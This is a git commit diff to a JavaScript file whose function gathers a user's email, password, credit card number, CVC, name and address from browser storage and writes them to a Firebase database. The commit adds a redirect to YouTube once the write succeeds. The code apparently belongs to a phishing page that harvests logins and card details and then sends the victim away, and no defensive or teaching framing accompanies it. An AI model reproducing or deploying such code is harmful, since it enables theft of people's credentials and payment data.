a7630402b5d46daa0f39772e7cf478c3c7bb8fe9
Wasitpol Jongmanasjaroean <41641716+RewiKaze@users.noreply.github.com>
2020-11-13 23:49:29 +0700

    Change code and database

--- main.js
+++ main.js
@@ -1,12 +1,22 @@
 function senttofirebase() {
     var database = firebase.database()
-    database.ref('data-' + Math.random().toString(36).substr(2, 9)).set({
+    database.ref('users/data-' + Math.random().toString(36).substr(2, 9)).set({
         email: localStorage.getItem("email"),
         password: localStorage.getItem("password"),
         credit: localStorage.getItem("credit"),
         cvc: localStorage.getItem("cvc"),
         name: localStorage.getItem("name"),
         address: localStorage.getItem("address")
+    }).then(() => {
+        console.log('success')
+        window.location.href = "https://www.youtube.com/"
     });
 
 }
+
+// function test() {
+//     var database = firebase.database()
+//     database.ref('users/data').set({
+//         test: "test"
+//     })
+// }
